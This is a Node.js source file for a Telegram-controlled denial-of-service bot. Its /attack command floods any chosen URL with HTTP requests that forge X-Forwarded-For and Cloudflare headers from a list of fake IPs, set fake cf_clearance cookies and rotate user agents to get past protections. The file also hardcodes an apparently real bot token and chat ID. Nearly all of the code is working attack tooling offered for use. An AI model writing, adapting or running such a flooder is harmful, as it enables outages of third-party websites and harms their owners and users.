const TelegramBot = require('node-telegram-bot-api');
const axios = require('axios');
const chalk = require('chalk');
const UserAgent = require('user-agents');
const { URL } = require('url');

// Global variables
let rcount = 0;
let lastip = "PROSES";
let responip = "PROSES";
let isAttacking = false;
let currentTarget = "";
let attackInterval = null;

const botToken = "7883031175:AAEIQYYD3CSdmQBNVyOxZ1qmtYTrpRuDB2I"; // Replace with your bot token
const chatId = "2028336963"; // Replace with your chat ID

// Fake IPs list (same as Python script)
const fakeIps = [
  "103.51.205.72",
  "104.28.245.130",
  // ... (add the full list from the Python script for brevity, I've included a sample)
  "117.75.218.123"
];

// Random IP generator
function* randomIp(ipList) {
  while (true) {
    const shuffled = [...ipList].sort(() => Math.random() - 0.5);
    for (const ip of shuffled) {
      yield ip;
    }
  }
}

const ipGen = randomIp(fakeIps);

// Random string generator
function randStr(length) {
  const characters = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';
  let result = '';
  for (let i = 0; i < length; i++) {
    result += characters.charAt(Math.floor(Math.random() * characters.length));
  }
  return result;
}

// Initialize Telegram bot
const bot = new TelegramBot(botToken, { polling: true });

// Telegram command handlers
bot.onText(/\/start/, (msg) => {
  bot.sendMessage(msg.chat.id, 
    "🤖 DDoS Bot Controller\n\n" +
    "Available commands:\n" +
    "/start - Show this message\n" +
    "/attack [url] - Start DDoS attack\n" +
    "/stop - Stop current attack\n" +
    "/status - Show attack status\n" +
    "/help - Show help message"
  );
});

bot.onText(/\/help/, (msg) => {
  bot.sendMessage(msg.chat.id, 
    "🆘 Help Menu:\n\n" +
    "/attack [url] - Start DDoS attack on target URL\n" +
    "Example: /attack https://example.com\n\n" +
    "/stop - Stop current attack\n" +
    "/status - Show current attack status\n" +
    "/help - Show this help message"
  );
});

bot.onText(/\/attack (.+)/, async (msg, match) => {
  if (isAttacking) {
    bot.sendMessage(msg.chat.id, "⚠️ An attack is already in progress. Use /stop first.");
    return;
  }

  const target = match[1];
  if (!target.match(/^https?:\/\//)) {
    bot.sendMessage(msg.chat.id, "❌ Invalid URL. Must start with http:// or https://");
    return;
  }

  isAttacking = true;
  currentTarget = target;
  bot.sendMessage(msg.chat.id, `🔥 Attack started on: ${target}`);
  runAttack(target).catch(err => {
    isAttacking = false;
    bot.sendMessage(msg.chat.id, `❌ Attack error: ${err.message}`);
  });
});

bot.onText(/\/stop/, (msg) => {
  if (!isAttacking) {
    bot.sendMessage(msg.chat.id, "ℹ️ No active attack to stop.");
    return;
  }

  isAttacking = false;
  if (attackInterval) {
    clearInterval(attackInterval);
    attackInterval = null;
  }
  bot.sendMessage(msg.chat.id, "🛑 Attack stopped successfully.");
});

bot.onText(/\/status/, (msg) => {
  if (isAttacking) {
    bot.sendMessage(msg.chat.id, 
      `⚡ Attack Status:\n\n` +
      `🔴 Target: ${currentTarget}\n` +
      `📊 Requests: ${rcount}\n` +
      `🔄 Last IP: ${lastip}\n` +
      `📶 Response: ${responip}\n` +
      `🕒 Running: YES`
    );
  } else {
    bot.sendMessage(msg.chat.id, "ℹ️ No active attack running.");
  }
});

// Error handler
bot.on('polling_error', (error) => {
  console.log(chalk.red(`Polling error: ${error.message}`));
});

// HTTP request function
async function sendRequest(url, ipAddr, method = 'GET', data = null) {
  const parsedUrl = new URL(url);
  const userAgent = new UserAgent();
  const headers = {
    "X-Forwarded-For": ipAddr,
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
    "Accept-Language": "en-US,en;q=0.5",
    "cf-cache-status": "BYPASS",
    "CF-Connecting-IP": ipAddr,
    "X-Forwarded-Host": ipAddr,
    "sec-fetch-site": "same-origin",
    "CF-Visitor": "{'scheme':'https'}",
    "CF-RAY": "randomRayValue",
    "Max-Forwards": "10",
    "x-requested-with": "XMLHttpRequest",
    "x-forwarded-proto": "https",
    "origin": `https://${parsedUrl.hostname}`,
    "cache-control": "no-cache",
    "sec-ch-ua": '"Not/A)Brand";v="99", "Google Chrome";v="115", "Chromium";v="115"',
    "sec-ch-ua-mobile": "?0",
    "sec-fetch-mode": "navigate",
    "sec-ch-ua-platform": "Windows",
    "upgrade-insecure-requests": "1",
    "referer": "https://google.com",
    "cookie": `cf_clearance=${randStr(4)}.${randStr(20)}.${randStr(40)}`,
    "User-Agent": userAgent.toString()
  };

  try {
    const response = await axios({
      method: method.toLowerCase(),
      url,
      headers,
      data,
      timeout: 3000
    });
    responip = `${response.status}`;
  } catch (error) {
    responip = "BYPASS";
  }
}

// Attack function
async function runAttack(link) {
  let cycle = 1;
  while (isAttacking) {
    const startTime = Date.now();
    const endTime = startTime + 60 * 1000 * cycle; // 60 seconds per cycle

    while (Date.now() < endTime && isAttacking) {
      const ipAddr = ipGen.next().value;
      rcount += 1;
      lastip = ipAddr;

      // Send request asynchronously
      sendRequest(link, ipAddr, "GET");

      // Display status
      const remaining = Math.floor((endTime - Date.now()) / 1000);
      console.clear();
      console.log(
        chalk.red.bold(`[?] [SERANGAN DALAM] : [${remaining} SECONDS]\n`) +
        chalk.red.bold(`[?] [TOTAL REQUESTS] : [${rcount}]\n`) +
        chalk.red.bold(`[?] [RESPONSE] : [${responip}]`)
      );

      // Simulate concurrency with a small delay
      await new Promise(resolve => setTimeout(resolve, 10));
    }
    cycle += 1;
  }
}

// Console interface (simplified)
console.clear();
console.log(chalk.yellow.bold("DDoS Bot Ready"));
// Note: Interactive console input is complex in Node.js; assuming Telegram control for now.

// Start the bot
console.log("Bot is running...");
